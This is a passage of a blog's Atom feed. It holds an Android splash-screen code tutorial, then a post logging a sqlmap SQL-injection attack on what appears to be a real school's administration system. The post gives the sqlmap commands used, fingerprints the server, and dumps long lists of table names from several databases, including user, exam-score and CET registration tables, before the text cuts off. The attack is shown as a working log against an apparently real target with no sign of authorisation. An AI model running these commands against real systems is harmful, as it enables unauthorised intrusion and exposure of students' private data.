+    <id>http://mzkmzk.github.io/blog/2015/06/22/android_welcome</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00Activity</h3>
+
+<pre><code>import java.util.TimerTask;
+
+import com.tjrac.R;
+import com.tjrac.activity._0.LoginActivity;
+
+import android.os.Bundle;
+import android.os.Handler;
+import android.app.Activity;
+import android.content.Intent;
+import android.graphics.drawable.Drawable;
+import android.view.View;
+import android.view.WindowManager;
+import android.view.animation.Animation;
+import android.view.animation.AnimationUtils;
+import android.view.animation.Animation.AnimationListener;
+import android.widget.ImageView;
+
+public class WelcomeActivity extends Activity {
+
+private ImageView mShowPicture = null;// 显示图片
+private Animation mFadeIn = null;// 开始动画
+private Animation mFadeOut = null;// 开始动画
+private Drawable mPicture_1 = null;// 第一张图片
+private Drawable mPicture_2 = null;
+private ImageView mShowtext = null;;
+
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+    this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,  
+    WindowManager.LayoutParams.FLAG_FULLSCREEN);//去掉信息栏  
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.welcome_activity);
+    // 绑定界面
+    mShowPicture = (ImageView) findViewById(R.id.guide_picture);
+    mShowtext = (ImageView) findViewById(R.id.guide_text);
+
+
+
+    // 初始化图片资源
+    mPicture_1 = getResources().getDrawable(R.drawable.ic_launcher);
+
+    // 设置开始界面效果
+    mShowPicture.setImageDrawable(mPicture_1);
+    Animation anim = AnimationUtils.loadAnimation(this, R.anim.mshowpicture);
+    anim.setFillAfter(true);
+    mShowPicture.startAnimation(anim);
+
+    mPicture_2 = getResources().getDrawable(R.drawable.pac_bg_text3);
+    mShowtext.setImageDrawable(mPicture_2);
+    mShowtext.setVisibility(View.GONE);       
+
+    mFadeIn = AnimationUtils.loadAnimation(this,R.anim.guide_welcome_fade_in);
+    mFadeIn.setDuration(1500L);
+
+
+
+    // 初始化动画
+    Handler handler = new Handler();
+    TimerTask task = new TimerTask() {
+        @Override
+        public void run() {
+            // 隐藏掉全屏图片
+            mShowtext.setVisibility(View.VISIBLE);
+            mShowtext.startAnimation(mFadeIn);
+        }
+    };
+    // 5秒后执行TimerTask任务
+    handler.postDelayed(task, 1500);
+
+    // 设置动画的监听
+    mFadeIn.setAnimationListener(new AnimationListener() {
+
+        @Override
+        public void onAnimationStart(Animation animation) {
+
+        }
+
+        @Override
+        public void onAnimationRepeat(Animation animation) {
+
+        }
+
+        @Override
+        public void onAnimationEnd(Animation animation) {
+            // 第一个动画结束时开始第二个动画
+            startActivity(new Intent(WelcomeActivity.this,LoginActivity.class));
+            finish();
+        }
+    });
+}
+}
+</code></pre>
+
+<h3>0x01 布局文件</h3>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+android:orientation="vertical"
+android:background="@color/color_white" &gt;
+
+&lt;RelativeLayout
+    android:layout_width="fill_parent"
+    android:layout_height="fill_parent"
+    android:orientation="vertical" &gt;
+
+    &lt;ImageView
+        android:id="@+id/guide_picture"
+        android:layout_width="120.0dip"
+        android:layout_height="120.0dip"
+        android:layout_centerHorizontal="true" 
+        android:layout_marginTop="200.0dip"
+        android:scaleType="fitXY" /&gt;
+
+    &lt;ImageView
+        android:id="@+id/guide_text"
+        android:layout_width="250.0dip"
+        android:layout_height="30.0dip"
+        android:layout_centerHorizontal="true" 
+        android:layout_below="@id/guide_picture"
+        android:layout_marginTop="30.0dip"
+        android:scaleType="fitXY" /&gt;
+
+&lt;/RelativeLayout&gt;
+
+&lt;/FrameLayout&gt;
+</code></pre>
+
+<h3>0x02动画anim</h3>
+
+<p>guide_welcome_fade_in.xml</p>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;set xmlns:android="http://schemas.android.com/apk/res/android" &gt;
+
+&lt;alpha
+    android:fromAlpha="0.0"
+    android:toAlpha="1.0" /&gt;
+&lt;/set&gt;
+</code></pre>
+
+<p>mshowpicture.xml</p>
+
+<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;set xmlns:android="http://schemas.android.com/apk/res/android"
+    android:interpolator="@android:anim/decelerate_interpolator"&gt;
+
+   &lt;translate android:fromYDelta="0" android:toYDelta="-100" android:duration="1500" /&gt;
+   &lt;alpha android:fromAlpha="0.0" android:toAlpha="1.0" android:duration="1500"/&gt;
+
+&lt;/set&gt;
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[sqlmap渗透bm系统过程]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/06/sqlmap_tjrac_bm/"/>
+    <updated>2015-06-06T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/06/06/sqlmap_tjrac_bm</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00渗透点</h3>
+
+<pre><code>python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --tables 
+</code></pre>
+
+<h3>0x01判断是否为dba</h3>
+
+<pre><code> python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --is-dba
+</code></pre>
+
+<p>得到的结果是false</p>
+
+<p>得到了其他信息</p>
+
+<pre><code>web server operating system: Windows 2003 or XP
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 1.1.4322
+back-end DBMS: Microsoft SQL Server 2000
+</code></pre>
+
+<h3>0x02获取数据库表</h3>
+
+<pre><code>python sqlmap.py -r ~/Project/渗透tjrac.bm/bm_search_LunWen.txt  --tables 
+</code></pre>
+
+<p>得到</p>
+
+<p>Database: RCY                                                                <br/>
+[4 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| dtproperties                                |
+| rcy_users                                   |
+| sysconstraints                              |
+| syssegments                                 |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: paperzh
+[64 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| B_AcademicTitle                             |
+| B_CopyRight                                 |
+| B_DepName                                   |
+| B_Power                                     |
+| Dic_Table                                   |
+| Paper_ItemList                              |
+| Paper_KtReport_Save                         |
+| Paper_KtReport_Save                         |
+| Paper_Notes_Save                            |
+| Paper_Notes_Save                            |
+| Paper_Power                                 |
+| Paper_Rws_Save                              |
+| Paper_Rws_Save                              |
+| Paper_SelectReason_Save                     |
+| Paper_SelectReason_Save                     |
+| Paper_SelectSubject_Save                    |
+| Paper_SelectSubject_Save                    |
+| Paper_Setting                               |
+| Paper_Source                                |
+| Paper_Students_Save                         |
+| Paper_Students_pre                          |
+| Paper_Students_pre                          |
+| Paper_Subject_Save                          |
+| Paper_Subject_Save                          |
+| Paper_TeachPlace                            |
+| Paper_ZqCheck_Save                          |
+| Paper_ZqCheck_Save                          |
+| Paper_Ztf                                   |
+| Paper_users                                 |
+| paper_backup                                |
+| sysconstraints                              |
+| syssegments                                 |
+| vUsers                                      |
+| v_paper_backuppre                           |
+| v_paper_datasave                            |
+| v_paper_ktreport_sum                        |
+| v_paper_ktreport_sum                        |
+| v_paper_rws_sum                             |
+| v_paper_rws_sum                             |
+| v_paper_rwsex                               |
+| v_paper_selectreason_sum                    |
+| v_paper_selectreason_sum                    |
+| v_paper_selectsubject_sum                   |
+| v_paper_selectsubject_sum                   |
+| v_paper_stat_all                            |
+| v_paper_stat_cg                             |
+| v_paper_stat_kt                             |
+| v_paper_stat_notes                          |
+| v_paper_stat_rws                            |
+| v_paper_stat_selreason                      |
+| v_paper_stat_sum                            |
+| v_paper_stat_teacher                        |
+| v_paper_stat_zqcheck                        |
+| v_paper_students                            |
+| v_paper_subject_sum                         |
+| v_paper_subject_sum                         |
+| v_paper_task                                |
+| v_paper_upload_sum                          |
+| v_paper_upload_sum                          |
+| v_paper_users                               |
+| v_paper_zg1_sum                             |
+| v_paper_zg2_sum                             |
+| v_paper_zqcheck_sum                         |
+| v_paper_zqcheck_sum                         |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: homepage
+[22 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| B_DepName                                   |
+| B_School985                                 |
+| b_School211                                 |
+| dtproperties                                |
+| homepage_announce                           |
+| homepage_files                              |
+| homepage_graduate                           |
+| homepage_link                               |
+| homepage_navitem                            |
+| homepage_navitem                            |
+| homepage_news                               |
+| homepage_power                              |
+| homepage_recuritment                        |
+| homepage_roleitemurl                        |
+| homepage_roleitemurl                        |
+| homepage_rolerank                           |
+| homepage_specialty                          |
+| homepage_users                              |
+| sysconstraints                              |
+| syssegments                                 |
+| v_homepage_nav                              |
+| v_homepage_roleurl                          |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: BookMaterialzhengli
+[91 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| dtproperties                                |
+| sysconstraints                              |
+| syssegments                                 |
+| 专业表                                         |
+| 专业视图                                        |
+| 供书单位表                                       |
+| 供书单位退书表                                     |
+| 供书单位退书详情表                                   |
+| 供书单位退书详情视图                                  |
+| 供货商退书临时表                                    |
+| 供货商退书查询视图                                   |
+| 入库临时表                                       |
+| 入库查询视图                                      |
+| 入库表                                         |
+| 入库详情表                                       |
+| 入库详情视图                                      |
+| 出库临时表                                       |
+| 出库查询视图                                      |
+| 出库表                                         |
+| 出库详情表                                       |
+| 出库详情视图                                      |
+| 出版社表                                        |
+| 初始化表                                        |
+| 学生退书临时表                                     |
+| 学生退书查询视图                                    |
+| 学生退书表                                       |
+| 学生退书详情表                                     |
+| 学生退书详情视图                                    |
+| 学院表                                         |
+| 对外订购表                                       |
+| 对外订购详情表                                     |
+| 库存表                                         |
+| 报废查询视图                                      |
+| 报废表                                         |
+| 报废详情表                                       |
+| 报废详情视图                                      |
+| 教师教材订购表                                     |
+| 教师教材订购详情表                                   |
+| 教师退书查询视图                                    |
+| 教师退书表                                       |
+| 教师退书详情表                                     |
+| 教师退书详情视图                                    |
+| 教师领书成本视图                                    |
+| 教师领书查询视图                                    |
+| 教师领书表                                       |
+| 教师领书详情表                                     |
+| 教师领书详情视图                                    |
+| 教师领书退书查询视图                                  |
+| 教材临时预订表                                     |
+| 教材出库日统计表                                    |
+| 教材出库统计表                                     |
+| 教材基本情况表1                                           |
+| 教材基本情况表1                                           |
+| 教材基本情况视图                                    |
+| 教材跟踪查询视图                                    |
+| 有书教材基本情况视图                                  |
+| 班级表                                         |
+| 班级视图                                        |
+| 班级订书全视图                                     |
+| 班级订书统计简单视图                                  |
+| 班级订书表                                       |
+| 班级订书详情总视图                                   |
+| 班级订书详情表                                     |
+| 班级退书查询视图                                    |
+| 班级退书表                                       |
+| 班级退书详情表                                     |
+| 班级退书详情视图                                    |
+| 班级领书成本视图                                    |
+| 班级领书未结算视图                                   |
+| 班级领书查询视图                                    |
+| 班级领书模板班级表                                   |
+| 班级领书模板表                                     |
+| 班级领书模板视图                                    |
+| 班级领书表                                       |
+| 班级领书详情表                                     |
+| 班级领书详情视图                                    |
+| 班级领书退书查询视图                                  |
+| 用户表                                         |
+| 盘点表                                         |
+| 盘点详情查询视图                                    |
+| 盘点详情表                                       |
+| 盘点详情视图                                      |
+| 结算表                                         |
+| 销售临时表                                       |
+| 销售成本视图                                      |
+| 销售查询视图                                      |
+| 销售表                                         |
+| 销售详情表                                       |
+| 销售详情视图1                                           |
+| 销售详情视图1                                           |
+| 项目设置表                                       |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: tjrac
+[291 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| Accident_List                               |
+| App_Log                                     |
+| App_PaperLib                                |
+| B_CopyRight                                 |
+| B_DepName                                   |
+| B_ItemList                                  |
+| B_MZ                                        |
+| B_NewsType                                  |
+| B_Pay                                       |
+| B_Power                                     |
+| B_Province                                  |
+| B_StudentsAll                               |
+| B_TitleLink                                 |
+| B_XnXq                                      |
+| B_attendtype                                |
+| B_users                                     |
+| Books_Cet46User                             |
+| Books_Cet46_Save                            |
+| Books_ClassRoom_Print                       |
+| Books_ClassRoom_Print                       |
+| Books_List_Save                             |
+| Books_List_Save                             |
+| Books_Zyxxk                                 |
+| Books_ZyxxkStu                              |
+| Books_cetyyjb                               |
+| CJK12                                       |
+| CWC_CardID                                  |
+| ClassRoom_PreOrder                          |
+| ClassRoom_Type                              |
+| Contract_List                               |
+| Contract_Pay                                |
+| Course_Book_del                             |
+| Course_Book_del                             |
+| Course_EnableStus                           |
+| Course_Setting                              |
+| Device_ComputerModel                        |
+| Device_ComputerModel                        |
+| Device_Furniture                            |
+| Device_KeyLend                              |
+| Device_KeyManager                           |
+| Device_List                                 |
+| Device_ModifyHis                            |
+| Device_NoUse                                |
+| Device_Repair                               |
+| Device_Type                                 |
+| Dic_Table                                   |
+| Dm_List                                     |
+| Dm_Users                                    |
+| Exam_Breachinfo                             |
+| Exam_Classroom                              |
+| Exam_ExamLib                                |
+| Exam_OnlineData                             |
+| Exam_PaperJunxun2                           |
+| Exam_PaperJunxun2                           |
+| Exam_PaperLib_Save                          |
+| Exam_PaperLib_Save                          |
+| Exam_PaperPsychology_Save                   |
+| Exam_PaperPsychology_Save                   |
+| Exam_PaperSafe                              |
+| Exam_PaperTiYubak                           |
+| Exam_PaperTiYubak                           |
+| Exam_QuestionLib                            |
+| Exam_Score_Save                             |
+| Exam_Score_Save                             |
+| Exam_Students                               |
+| Exam_TestType                               |
+| Lab_Category                                |
+| Lab_Education                               |
+| Lab_ExpertType                              |
+| Lab_Item                                    |
+| Lab_NationCode                              |
+| Lab_ProTechRank                             |
+| Lab_Require                                 |
+| Lab_RoomCategory                            |
+| Lab_RoomName                                |
+| Lab_RoomType                                |
+| Lab_SJ12009                                 |
+| Lab_SJ12010                                 |
+| Lab_SJ1_Save                                |
+| Lab_SJ1_Save                                |
+| Lab_SJ1bak                                  |
+| Lab_SJ2_Save                                |
+| Lab_SJ2_Save                                |
+| Lab_SJ3_Save                                |
+| Lab_SJ3_Save                                |
+| Lab_SJ4_Save                                |
+| Lab_SJ4_Save                                |
+| Lab_SJ5_Save                                |
+| Lab_SJ5_Save                                |
+| Lab_SJ61                                    |
+| Lab_SJ6_Save                                |
+| Lab_SJ6_Save                                |
+| Lab_SJ7_Save                                |
+| Lab_SJ7_Save                                |
+| Lab_Sex                                     |
+| Lab_StudentType                             |
+| Lab_Subject                                 |
+| Lab_Type                                    |
+| Merge_Score1_2031                           |
+| Merge_Score1_2061                           |
+| Merge_Score1_2063                           |
+| Merge_Score1_501                            |
+| Merge_Score1_502                            |
+| Merge_Score2_2031                           |
+| Merge_Score2_2061                           |
+| Merge_Score2_2063                           |
+| Merge_Score2_501                            |
+| Merge_Score2_502                            |
+| News_Push                                   |
+| OA_AdminUser                                |
+| OA_JwcNews                                  |
+| OA_JwcNotes                                 |
+| OA_Phone                                    |
+| OA_Teachers                                 |
+| Paper_KtReport                              |
+| Paper_Notes_Save                            |
+| Paper_Notes_Save                            |
+| Paper_Power                                 |
+| Paper_SelectSubject_Save                    |
+| Paper_SelectSubject_Save                    |
+| Paper_Setting                               |
+| Paper_Students_Save                         |
+| Paper_Students_Save                         |
+| Paper_Subject_Save                          |
+| Paper_Subject_Save                          |
+| Paper_Ztf                                   |
+| Paper_users                                 |
+| Seat_ChangeExaminer_Save                    |
+| Seat_ChangeExaminer_Save                    |
+| Seat_ClassRoom                              |
+| Seat_CourseLib6_28                          |
+| Seat_CourseLibPre                           |
+| Seat_CourseLib_Del                          |
+| Seat_CourseLib_Del                          |
+| Seat_CourseLib_Save                         |
+| Seat_Datalib6_28                            |
+| Seat_DatalibPre                             |
+| Seat_Datalib_Save                           |
+| Seat_Datalib_Save                           |
+| Seat_Datalibselect                          |
+| Seat_ExamTime                               |
+| Seat_ExamType                               |
+| Seat_Jxrwb                                  |
+| Seat_Xsxkb                                  |
+| VIEWExport                                  |
+| Video_List                                  |
+| ZSB_BM                                      |
+| allstu2014                                  |
+| books_ClassRoom_Save                        |
+| books_cet46_2011_12                         |
+| books_cet46_2011_12                         |
+| books_cet46_md5                             |
+| books_cet4score                             |
+| con06                                       |
+| con0708                                     |
+| con09                                       |
+| con10                                       |
+| con11                                       |
+| conzb                                       |
+| djksDragon_BM                               |
+| dm_userloginhis                             |
+| dtproperties                                |
+| exam_NonSchoolStu                           |
+| exam_junxunstu                              |
+| exam_paperby                                |
+| exam_paperparty_save                        |
+| exam_paperparty_save                        |
+| exam_stu20146                               |
+| exam_tiyuenew                               |
+| exam_tiyustudent2012                        |
+| labcenter_announce                          |
+| labcenter_book                              |
+| labcenter_intro                             |
+| labcenter_lab                               |
+| labcenter_navitems                          |
+| labcenter_news                              |
+| labcenter_openitem                          |
+| seat_datalibupdatehis                       |
+| sysconstraints                              |
+| syssegments                                 |
+| t_ks                                        |
+| temp132qk                                   |
+| temp142_kf                                  |
+| temp142cet46                                |
+| temp142score                                |
+| temp142userdel                              |
+| temp20131tiyu                               |
+| temp20132014_1_xinli                        |
+| temp20141212                                |
+| temp20141216                                |
+| temp20141219                                |
+| temp20141222                                |
+| temp20141223_fdy                            |
+| temp20141224_fdy                            |
+| temp2014_11_28                              |
+| temp_1bqx                                   |
+| temp_2015junxun                             |
+| temp_cet46927                               |
+| temp_choucha                                |
+| temp_djksjf                                 |
+| temp_lab_sj4                                |
+| temp_ncre40jf                               |
+| temp_nopay108                               |
+| temp_paperxlx                               |
+| temp_party_students                         |
+| temp_teacher                                |
+| temp_tiyu2014                               |
+| temp_tiyu2014                               |
+| temp_tiyuestu14151                          |
+| temp_tiyuuser2014                           |
+| temp_xlstu                                  |
+| temp_xxds                                   |
+| temp_y2ks                                   |
+| temp_y4                                     |
+| tempcet412                                  |
+| tempcet413                                  |
+| tempcet46_142                               |
+| tempcet46_151_md                            |
+| tempcet46bmh                                |
+| tempcet46qk                                 |
+| tempcet46score2014                          |
+| tempcet46userqx                             |
+| tempcet4no                                  |
+| tempcet4score                               |
+| tempcet6qxmd                                |
+| tempcet_ks                                  |
+| tempcetnoply                                |
+| tempcourselib1                              |
+| tempcourselib1                              |
+| tempe1e3                                    |
+| tempe1md                                    |
+| tempe3md                                    |
+| tempe3qx                                    |
+| tempgl                                      |
+| tempjf01                                    |
+| tempjf01                                    |
+| tempjunxunbk                                |
+| temptiyustu                                 |
+| tempttt                                     |
+| tempuser                                    |
+| tempwxl                                     |
+| vSeat_Courselib_save                        |
+| vSeat_Courselib_save                        |
+| vUsers                                      |
+| v_ClassRoom_Noon                            |
+| v_ClassRoom_Normal                          |
+| v_Lab_SJ1                                   |
+| v_Lab_SJ5                                   |
+| v_Lab_SJ6                                   |
+| v_Lab_Sj4                                   |
+| v_Lab_item                                  |
+| v_Seat_ChangeExaminer_Save                  |
+| v_Seat_ChangeExaminer_Save                  |
+| v_books_zyxxk                               |
+| v_books_zyxxkstu                            |
+| v_cet46_stuinfook                           |
+| v_cet46book_list_save                       |
+| v_cet46book_list_save                       |
+| v_dm_list_history                           |
+| v_dm_list_history                           |
+| v_dm_list_sum                               |
+| v_dm_queryall                               |
+| v_dm_queryall                               |
+| v_dm_querysubject                           |
+| v_dm_stu_sum                                |
+| v_exam_breachinfo                           |
+| v_exam_breachstats                          |
+| v_exam_score                                |
+| v_exam_teachcount                           |
+| v_lab_roomname                              |
+| v_oa_teachers                               |
+| v_seat_classroomrepeat                      |
+| v_seat_courselib_save                       |
+| v_seat_courselibimport                      |
+| v_seat_datalib_save                         |
+| v_seat_datalib_save                         |
+| v_seat_examlist                             |
+| v_seat_querydatalib                         |
+| v_seat_studentrepeat                        |
+| v_seat_xsxkb_stucount                       |
+| v_seat_xsxkb_stucount                       |
+| v_users                                     |
+| vbooks_List_Save                            |
+| vbooks_cet46_Save                           |
+| viewExamData                                |
+| viewScoreDataHis                            |
+| viewScoreDataHis                            |
+| viewSelectSubject                           |
+| viewShowCet46Info                           |
+| viewSumbooks                                |
+| viewbookslist                               |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: CET46
+[384 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| CollegeForeignLanguageTest072.a_bj          |
+| CollegeForeignLanguageTest072.a_xy          |
+| CollegeForeignLanguageTest072.a_zy          |
+| CollegeForeignLanguageTest072.b_kkyyjb      |
+| CollegeForeignLanguageTest072.bp_jd         |
+| CollegeForeignLanguageTest072.d_accept      |
+| CollegeForeignLanguageTest072.t_ks_modify   |
+| CollegeForeignLanguageTest072.t_ks_modify   |
+| CollegeForeignLanguageTest072.v_bmcount2_sd |
+| CollegeForeignLanguageTest072.v_bmcount2_sd |
+| CollegeForeignLanguageTest072.v_bmcount_sd  |
+| CollegeForeignLanguageTest072.v_bmcount_sd  |
+| CollegeForeignLanguageTest072.v_bpcount2_sd |
+| CollegeForeignLanguageTest072.v_bpcount2_sd |
+| CollegeForeignLanguageTest072.v_bpcount_sd  |
+| CollegeForeignLanguageTest072.v_bpcount_sd  |
+| CollegeForeignLanguageTest072.v_jtbm_sd     |
+| CollegeForeignLanguageTest072.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest072.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest072.v_ks_sd       |
+| CollegeForeignLanguageTest072.v_tj_bkrs     |
+| CollegeForeignLanguageTest072.v_yyjb_sd     |
+| CollegeForeignLanguageTest081.a_bj          |
+| CollegeForeignLanguageTest081.a_xy          |
+| CollegeForeignLanguageTest081.a_zy          |
+| CollegeForeignLanguageTest081.b_kkyyjb      |
+| CollegeForeignLanguageTest081.bp_jd         |
+| CollegeForeignLanguageTest081.d_accept      |
+| CollegeForeignLanguageTest081.t_ks_modify   |
+| CollegeForeignLanguageTest081.t_ks_modify   |
+| CollegeForeignLanguageTest081.v_bmcount2_sd |
+| CollegeForeignLanguageTest081.v_bmcount2_sd |
+| CollegeForeignLanguageTest081.v_bmcount_sd  |
+| CollegeForeignLanguageTest081.v_bmcount_sd  |
+| CollegeForeignLanguageTest081.v_bpcount2_sd |
+| CollegeForeignLanguageTest081.v_bpcount2_sd |
+| CollegeForeignLanguageTest081.v_bpcount_sd  |
+| CollegeForeignLanguageTest081.v_bpcount_sd  |
+| CollegeForeignLanguageTest081.v_jtbm_sd     |
+| CollegeForeignLanguageTest081.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest081.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest081.v_ks_sd       |
+| CollegeForeignLanguageTest081.v_tj_bkrs     |
+| CollegeForeignLanguageTest081.v_yyjb_sd     |
+| CollegeForeignLanguageTest082.a_bj          |
+| CollegeForeignLanguageTest082.a_xy          |
+| CollegeForeignLanguageTest082.a_zy          |
+| CollegeForeignLanguageTest082.b_kkyyjb      |
+| CollegeForeignLanguageTest082.bp_jd         |
+| CollegeForeignLanguageTest082.d_accept      |
+| CollegeForeignLanguageTest082.t_ks_modify   |
+| CollegeForeignLanguageTest082.t_ks_modify   |
+| CollegeForeignLanguageTest082.v_bmcount2_sd |
+| CollegeForeignLanguageTest082.v_bmcount2_sd |
+| CollegeForeignLanguageTest082.v_bmcount_sd  |
+| CollegeForeignLanguageTest082.v_bmcount_sd  |
+| CollegeForeignLanguageTest082.v_bpcount2_sd |
+| CollegeForeignLanguageTest082.v_bpcount2_sd |
+| CollegeForeignLanguageTest082.v_bpcount_sd  |
+| CollegeForeignLanguageTest082.v_bpcount_sd  |
+| CollegeForeignLanguageTest082.v_jtbm_sd     |
+| CollegeForeignLanguageTest082.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest082.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest082.v_ks_sd       |
+| CollegeForeignLanguageTest082.v_tj_bkrs     |
+| CollegeForeignLanguageTest082.v_yyjb_sd     |
+| CollegeForeignLanguageTest091.a_bj          |
+| CollegeForeignLanguageTest091.a_xy          |
+| CollegeForeignLanguageTest091.a_zy          |
+| CollegeForeignLanguageTest091.b_kkyyjb      |
+| CollegeForeignLanguageTest091.bp_jd         |
+| CollegeForeignLanguageTest091.d_accept      |
+| CollegeForeignLanguageTest091.t_ks_modify   |
+| CollegeForeignLanguageTest091.t_ks_modify   |
+| CollegeForeignLanguageTest091.v_bmcount2_sd |
+| CollegeForeignLanguageTest091.v_bmcount2_sd |
+| CollegeForeignLanguageTest091.v_bmcount_sd  |
+| CollegeForeignLanguageTest091.v_bmcount_sd  |
+| CollegeForeignLanguageTest091.v_bpcount2_sd |
+| CollegeForeignLanguageTest091.v_bpcount2_sd |
+| CollegeForeignLanguageTest091.v_bpcount_sd  |
+| CollegeForeignLanguageTest091.v_bpcount_sd  |
+| CollegeForeignLanguageTest091.v_jtbm_sd     |
+| CollegeForeignLanguageTest091.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest091.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest091.v_ks_sd       |
+| CollegeForeignLanguageTest091.v_tj_bkrs     |
+| CollegeForeignLanguageTest091.v_yyjb_sd     |
+| CollegeForeignLanguageTest092.a_bj          |
+| CollegeForeignLanguageTest092.a_xy          |
+| CollegeForeignLanguageTest092.a_zy          |
+| CollegeForeignLanguageTest092.b_kkyyjb      |
+| CollegeForeignLanguageTest092.bp_jd         |
+| CollegeForeignLanguageTest092.d_accept      |
+| CollegeForeignLanguageTest092.t_ks_modify   |
+| CollegeForeignLanguageTest092.t_ks_modify   |
+| CollegeForeignLanguageTest092.v_bmcount2_sd |
+| CollegeForeignLanguageTest092.v_bmcount2_sd |
+| CollegeForeignLanguageTest092.v_bmcount_sd  |
+| CollegeForeignLanguageTest092.v_bmcount_sd  |
+| CollegeForeignLanguageTest092.v_bpcount2_sd |
+| CollegeForeignLanguageTest092.v_bpcount2_sd |
+| CollegeForeignLanguageTest092.v_bpcount_sd  |
+| CollegeForeignLanguageTest092.v_bpcount_sd  |
+| CollegeForeignLanguageTest092.v_jtbm_sd     |
+| CollegeForeignLanguageTest092.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest092.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest092.v_ks_sd       |
+| CollegeForeignLanguageTest092.v_tj_bkrs     |
+| CollegeForeignLanguageTest092.v_yyjb_sd     |
+| CollegeForeignLanguageTest101.a_bj          |
+| CollegeForeignLanguageTest101.a_xy          |
+| CollegeForeignLanguageTest101.a_zy          |
+| CollegeForeignLanguageTest101.b_kkyyjb      |
+| CollegeForeignLanguageTest101.bp_jd         |
+| CollegeForeignLanguageTest101.d_accept      |
+| CollegeForeignLanguageTest101.t_ks_modify   |
+| CollegeForeignLanguageTest101.t_ks_modify   |
+| CollegeForeignLanguageTest101.v_bmcount2_sd |
+| CollegeForeignLanguageTest101.v_bmcount2_sd |
+| CollegeForeignLanguageTest101.v_bmcount_sd  |
+| CollegeForeignLanguageTest101.v_bmcount_sd  |
+| CollegeForeignLanguageTest101.v_bpcount2_sd |
+| CollegeForeignLanguageTest101.v_bpcount2_sd |
+| CollegeForeignLanguageTest101.v_bpcount_sd  |
+| CollegeForeignLanguageTest101.v_bpcount_sd  |
+| CollegeForeignLanguageTest101.v_jtbm_sd     |
+| CollegeForeignLanguageTest101.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest101.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest101.v_ks_sd       |
+| CollegeForeignLanguageTest101.v_tj_bkrs     |
+| CollegeForeignLanguageTest101.v_yyjb_sd     |
+| CollegeForeignLanguageTest102.a_bj          |
+| CollegeForeignLanguageTest102.a_xy          |
+| CollegeForeignLanguageTest102.a_zy          |
+| CollegeForeignLanguageTest102.b_kkyyjb      |
+| CollegeForeignLanguageTest102.bp_jd         |
+| CollegeForeignLanguageTest102.d_accept      |
+| CollegeForeignLanguageTest102.t_ks_modify   |
+| CollegeForeignLanguageTest102.t_ks_modify   |
+| CollegeForeignLanguageTest102.v_bmcount2_sd |
+| CollegeForeignLanguageTest102.v_bmcount2_sd |
+| CollegeForeignLanguageTest102.v_bmcount_sd  |
+| CollegeForeignLanguageTest102.v_bmcount_sd  |
+| CollegeForeignLanguageTest102.v_bpcount2_sd |
+| CollegeForeignLanguageTest102.v_bpcount2_sd |
+| CollegeForeignLanguageTest102.v_bpcount_sd  |
+| CollegeForeignLanguageTest102.v_bpcount_sd  |
+| CollegeForeignLanguageTest102.v_jtbm_sd     |
+| CollegeForeignLanguageTest102.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest102.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest102.v_ks_sd       |
+| CollegeForeignLanguageTest102.v_tj_bkrs     |
